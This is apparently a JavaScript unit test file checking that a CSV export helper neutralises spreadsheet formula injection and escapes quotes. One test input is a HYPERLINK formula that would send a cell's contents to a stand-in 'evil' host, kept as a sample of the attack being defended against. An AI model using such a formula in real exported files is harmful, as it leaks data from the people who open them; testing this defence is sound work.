import assert from "node:assert/strict";
import test from "node:test";

import { csvCell, csvText } from "../static/csv.js";

test("formula-like text is exported as text", () => {
  assert.equal(csvCell("=1+1"), `"'=1+1"`);
  assert.equal(csvCell('=HYPERLINK("http://evil/?"&A1,"x")'), `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`);
  for (const prefix of ["+", "-", "@", "\t", "\r"]) {
    assert.equal(csvCell(`${prefix}cmd`), `"'${prefix}cmd"`);
  }
});

test("numbers and ordinary text are unchanged", () => {
  assert.equal(csvCell(-3.2), `"-3.2"`);
  assert.equal(csvCell(0), `"0"`);
  assert.equal(csvCell("Germany"), `"Germany"`);
  assert.equal(csvCell("Côte d'Azur = coast"), `"Côte d'Azur = coast"`);
  assert.equal(csvCell(null), `""`);
  assert.equal(csvCell(undefined), `""`);
});

test("quotes are escaped", () => {
  assert.equal(csvCell('say "hi"'), `"say ""hi"""`);
});

test("csv text includes a header row and neutralises labels and values", () => {
  const columns = [
    { key: "geo_label", label: "Geography" },
    { key: "value", label: "=Value" },
  ];
  const rows = [
    { geo_label: "Germany", value: -1.5 },
    { geo_label: "@SUM(A1)", value: 2 },
  ];
  assert.equal(
    csvText(rows, columns),
    [`"Geography","'=Value"`, `"Germany","-1.5"`, `"'@SUM(A1)","2"`].join("\n"),
  );
});
